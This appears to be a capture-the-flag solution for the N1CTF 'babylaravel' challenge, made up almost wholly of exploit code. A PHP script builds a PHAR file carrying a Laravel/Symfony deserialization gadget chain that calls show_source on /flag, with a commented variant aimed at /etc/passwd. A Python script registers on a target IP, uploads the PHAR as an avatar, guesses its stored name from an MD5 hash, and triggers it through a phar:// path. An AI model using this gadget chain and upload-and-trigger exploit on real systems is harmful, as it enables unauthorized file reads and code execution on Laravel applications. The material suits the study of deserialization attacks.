# old attack (step 2)

- unserialize attack on `is_file`.
- we need to find a gadget on laravel source code.

- make_phar.php

```php
<?php
namespace Symfony\Component\Lock
{
	use Psr\Log\LoggerAwareInterface;
	use Psr\Log\LoggerAwareTrait;
	use Psr\Log\NullLogger;
	use Symfony\Component\Lock\Exception\InvalidArgumentException;
	use Symfony\Component\Lock\Exception\LockAcquiringException;
	use Symfony\Component\Lock\Exception\LockConflictedException;
	use Symfony\Component\Lock\Exception\LockExpiredException;
	use Symfony\Component\Lock\Exception\LockReleasingException;
	
	class Lock {
		
		private $store;
	    private $key;
	    private $ttl;
	    private $autoRelease;
	    private $dirty = false;
		
		public function __construct($store, $key)
	    {
	        $this->store = $store;
        	$this->key = $key;
        	$this->ttl = true;
	    	$this->autoRelease = true;
	    	$this->dirty = true;
	    }
	}
	class Key{
		private $resource;
		function __construct($resource){
			$this->resource = $resource;
		}
	}

}
namespace Symfony\Component\Lock\Store
{
	use Symfony\Component\Cache\Traits\RedisClusterProxy;
	use Symfony\Component\Cache\Traits\RedisProxy;
	use Symfony\Component\Lock\Exception\InvalidArgumentException;
	use Symfony\Component\Lock\Exception\LockConflictedException;
	use Symfony\Component\Lock\Key;
	use Symfony\Component\Lock\StoreInterface;

	class RedisStore{
	    private $redis;
    	private $initialTtl;


	    public function __construct($redis, $initialTtl)
	    {
	        $this->redis = $redis;
	        $this->initialTtl = $initialTtl;
	    }
	}
}



namespace Illuminate\Filesystem
{
	use RuntimeException;
	use Illuminate\Http\File;
	use Illuminate\Support\Arr;
	use Illuminate\Support\Str;
	use InvalidArgumentException;
	use Illuminate\Support\Carbon;
	use Illuminate\Http\UploadedFile;
	use Illuminate\Support\Collection;
	use League\Flysystem\AdapterInterface;
	use PHPUnit\Framework\Assert as PHPUnit;
	use League\Flysystem\FileExistsException;
	use League\Flysystem\FilesystemInterface;
	use League\Flysystem\AwsS3v3\AwsS3Adapter;
	use League\Flysystem\Cached\CachedAdapter;
	use League\Flysystem\FileNotFoundException;
	use League\Flysystem\Rackspace\RackspaceAdapter;
	use League\Flysystem\Adapter\Local as LocalAdapter;
	use Symfony\Component\HttpFoundation\StreamedResponse;
	use Illuminate\Contracts\Filesystem\Cloud as CloudFilesystemContract;
	use Illuminate\Contracts\Filesystem\Filesystem as FilesystemContract;
	use Illuminate\Contracts\Filesystem\FileExistsException as ContractFileExistsException;
	use Illuminate\Contracts\Filesystem\FileNotFoundException as ContractFileNotFoundException;

	class FilesystemAdapter{
    	protected $driver;
    	public function __construct($driver)
	    {		
	        $this->driver = $driver;
	    }
	}	
}
namespace Symfony\Component\Validator\Mapping\Cache
{
	use Psr\Cache\CacheItemPoolInterface;
	use Symfony\Component\Validator\Mapping\ClassMetadata;
	class Psr6Cache{
		private $cacheItemPool;
		public function __construct($cacheItemPool)
	    {
	        $this->cacheItemPool = $cacheItemPool;
	    }
	}	
}
namespace Symfony\Component\Cache\Adapter
{
	use Psr\Cache\CacheItemInterface;
	use Symfony\Component\Cache\CacheItem;
	use Symfony\Contracts\Cache\CacheInterface;

	class NullAdapter {
		private $createCacheItem;

	    public function __construct($createCacheItem)
	    {
	        $this->createCacheItem = $createCacheItem;
	    }
	}
}

namespace{
	/*
    echo urlencode(
    	serialize(
    		new \Symfony\Component\Lock\Lock(
    			new \Symfony\Component\Lock\Store\RedisStore(new \Illuminate\Filesystem\FilesystemAdapter(new \Symfony\Component\Validator\Mapping\Cache\Psr6Cache(new \Symfony\Component\Cache\Adapter\NullAdapter('show_source'))), 'hhihihihihihi'), new \Symfony\Component\Lock\Key('/etc/passwd')
    		)

        )	
    );
    */
    
	$phar = new Phar('adm1nkyj.phar');
        $phar->startBuffering();
        $phar->addFromString('adm1nkyj.phar', 'text');
        $phar->setStub('php __HALT_COMPILER(); ?>');

        $object = new \Symfony\Component\Lock\Lock(
    			new \Symfony\Component\Lock\Store\RedisStore(new \Illuminate\Filesystem\FilesystemAdapter(new \Symfony\Component\Validator\Mapping\Cache\Psr6Cache(new \Symfony\Component\Cache\Adapter\NullAdapter('show_source'))), 'hhihihihihihi'), new \Symfony\Component\Lock\Key('/flag')
    		);
        $phar->setMetadata($object);
        $phar->stopBuffering();
	
}
?>

```

- exploit.py

```python
import requests
import os
import hashlib
import time

cookies = {
}

headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Origin': 'http://150.109.197.222',
    'Upgrade-Insecure-Requests': '1',
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
    'Referer': 'http://150.109.197.222/register',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7',
}

prefix = os.urandom(4).encode('hex')
email = prefix + 'juno@gmail.com'
name = prefix + 'junoim1234'

data = {
  '_token': 'Tr0c07PA7Hs8vweOOAa8AnGtrVYExI7H6Ckbhb31',
  'name': 'ADMIN' + '\x0b' * 0xb + 'junoim1234fucks',
  'email': 'junoim1234@naver.com',
  'password': 'asdfasdf',
  'password_confirmation': 'asdfasdf'
}


s = requests.Session()
c = s.get('http://150.109.197.222/register')
token = c.text.split('_token" value="')[1].split('"')[0]

data['_token'] = token
data['email'] = email
data['name'] = name

response = s.post('http://150.109.197.222/register', headers=headers, data=data, verify=False)

user_id = response.text.split('"./userpage/')[1].split('"')[0]

response = s.get('http://150.109.197.222/', headers=headers)
print response.headers

c = s.get('http://150.109.197.222/api/user/'+email.replace('@', '%40'))
print c.status_code
'''
c = requests.get('http://app.imjuno.com/juno.phar')
with open('exp.phar', 'wb') as f:
  f.write(c.content)
'''

# /var/www/html/babyphoto/storage/app/avatars/


c = s.get('http://150.109.197.222/userpage/' + user_id)
token = c.text.split('_token" value="')[1].split('"')[0]


go = int(requests.get('http://150.109.197.222/time.php').text)
print go
c = s.post('http://150.109.197.222/userpage/' + user_id, files={'avatar': open('adm1nkyj.phar', 'rb')}, data={'_token': token})
print c.text

print 'done?'

for i in range(1, 2):
  hashhash = str(go + i) + str(user_id)
  print user_id
  print hashhash
  out = hashlib.md5(hashhash).hexdigest()
  print out

  url = 'http://150.109.197.222/userpage/' + ('phar://./../storage/app/avatars/' + out + '.gif').encode('base64').replace('\n', '')
  c = s.get(url)
  print c.text

  #print url


```

- flag: N1CTF{babylaravel_lo0ks_easy_wow233_hav3fun_Nu1L}
